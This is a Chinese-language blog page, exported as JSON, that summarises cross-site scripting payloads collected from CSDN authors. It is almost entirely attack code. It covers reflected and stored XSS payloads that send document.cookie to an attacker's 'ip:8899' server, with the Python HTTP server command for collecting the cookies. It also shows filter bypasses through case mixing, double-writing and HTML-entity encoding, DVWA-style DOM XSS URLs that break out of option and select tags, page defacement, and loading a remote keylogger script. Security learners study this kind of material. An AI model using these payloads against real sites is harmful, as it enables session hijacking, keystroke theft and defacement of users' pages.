{"title":"XSS总结","uid":"ae3f5805d60d8654d0fdb80999bd8b4a","text":" payload来自csdn-仙女象 反射型XSS&lt;script&gt;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&...","date":"2021-11-09T13:57:15.000Z","updated":"2021-11-09T14:23:19.995Z","comments":true,"path":"api/pages/XSS总结.json","covers":null,"excerpt":"","content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<p>payload来自csdn-仙女象</p>\n<h2 id=\"反射型XSS\"><a href=\"#反射型XSS\" class=\"headerlink\" title=\"反射型XSS\"></a>反射型XSS</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;script&gt;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&lt;&#x2F;script&gt;  \n#获取cookie，需要攻击机开机http服务\npython2 -m SimpleHTTPServer 8899</code></pre>\n\n<p>大小写绕过</p>\n<p>使用其他标签</p>\n<p>编码绕过</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;sCript&gt;alert(1)&lt;&#x2F;script&gt;\n&lt;img src&#x3D;x οnerrοr&#x3D;alert(1)&gt;\n&lt;img src&#x3D;x οnerrοr&#x3D;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&gt;\n\n&lt;a href&#x3D;&quot;&quot; οnclick&#x3D;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#119;&amp;#114;&amp;#105;&amp;#116;&amp;#101;&amp;#40;&#39;&amp;#60;&amp;#105;&amp;#109;&amp;#103;&amp;#32;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#105;&amp;#112;&amp;#58;&amp;#56;&amp;#56;&amp;#57;&amp;#57;&amp;#47;&#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#43;&#39;&amp;#34;&amp;#47;&amp;#62;&#39;&amp;#41;&gt;hh&lt;&#x2F;a&gt;\n#onclick后面是html实体编码了，明文payload是&lt;a href&#x3D;&quot;&quot; οnclick&#x3D;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&gt;hh&lt;&#x2F;a&gt;\n\n&lt;img alt&#x3D;x οnmοuseοver&#x3D;alert(1)&gt;\n&lt;img alt&#x3D;x οnmοuseοver&#x3D;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&gt;\n&lt;input οnblur&#x3D;&quot;alert(1)&quot;&gt;\n&lt;input οnblur&#x3D;&quot;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&quot;&gt;</code></pre>\n\n<h2 id=\"存储型XSS\"><a href=\"#存储型XSS\" class=\"headerlink\" title=\"存储型XSS\"></a>存储型XSS</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;script&gt;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&lt;&#x2F;script&gt;\n#获取cookie，需要攻击机开机http服务\npython2 -m SimpleHTTPServer 8899\npython3 -m http.server 8899</code></pre>\n\n<p>修改客户端源代码绕过长度限制</p>\n<p>大小写绕过，双写绕过</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;scrip&lt;script&gt;t&gt;alert(1)&lt;&#x2F;scrip&lt;script&gt;t&gt;\n&lt;img src&#x3D;x οnerrοr&#x3D;alert(1)&gt;\n&lt;iframe οnlοad&#x3D;alert(1)&gt;&lt;&#x2F;iframe&gt;\n\n&lt;a href&#x3D;&quot;&quot; οnclick&#x3D;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#119;&amp;#114;&amp;#105;&amp;#116;&amp;#101;&amp;#40;&#39;&amp;#60;&amp;#105;&amp;#109;&amp;#103;&amp;#32;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#105;&amp;#112;&amp;#58;&amp;#56;&amp;#56;&amp;#57;&amp;#57;&amp;#47;&#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#43;&#39;&amp;#34;&amp;#47;&amp;#62;&#39;&amp;#41;&gt;hh&lt;&#x2F;a&gt;\n</code></pre>\n\n<h2 id=\"DOM型XSS-payload来自csdn谢公子\"><a href=\"#DOM型XSS-payload来自csdn谢公子\" class=\"headerlink\" title=\"DOM型XSS-payload来自csdn谢公子\"></a>DOM型XSS-payload来自csdn谢公子</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;&lt;script&gt;alert(&#39;hack&#39;)&lt;&#x2F;script&gt;\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;&lt;img src&#x3D;1 οnerrοr&#x3D;alert(&#39;hack&#39;)&gt; \n我们得先闭合前面的标签，我们构造语句闭合option标签：\n &lt;option value&#x3D;&#39;     &quot; + lang + &quot;      &#39;&gt;  &quot;  + decodeURI(lang) +  &quot;  &lt;&#x2F;option&gt;\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;&gt;&lt;&#x2F;option&gt;&lt;img src&#x3D;1 οnerrοr&#x3D;alert(&#39;hack&#39;)&gt; \n\n继续构造语句去闭合select标签\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D; &gt;&lt;&#x2F;option&gt;&lt;&#x2F;select&gt;&lt;img src&#x3D;1 οnerrοr&#x3D;alert(&#39;hack&#39;)&gt;</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#x2F;xss_d&#x2F;?default&#x3D;&lt;script&gt;var img&#x3D;document.createElement(&quot;img&quot;);img.src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;a?&quot;+escape(document.cookie);&lt;&#x2F;script&gt;  #获取cookie\n\n&#x2F;xss_d&#x2F;?default&#x3D;&lt;script&gt;document.body.innerHTML&#x3D;&quot;&lt;div style&#x3D;visibility:visible;&gt;&lt;h1&gt;DOM XSS By SKI12&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&quot;;&lt;&#x2F;script&gt;\n#篡改页面\n\n&#x2F;xss_d&#x2F;?default&#x3D;&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;keylogger.js&quot;&gt;&lt;&#x2F;script&gt;\n#键盘记录，有js文件和php文件。来自于csdn-Mi1k7ea</code></pre>\n\n","count_time":{"symbolsCount":"4.4k","symbolsTime":"4 mins."},"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS\"><span class=\"toc-text\">反射型XSS</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AD%98%E5%82%A8%E5%9E%8BXSS\"><span class=\"toc-text\">存储型XSS</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#DOM%E5%9E%8BXSS-payload%E6%9D%A5%E8%87%AAcsdn%E8%B0%A2%E5%85%AC%E5%AD%90\"><span class=\"toc-text\">DOM型XSS-payload来自csdn谢公子</span></a></li></ol>"}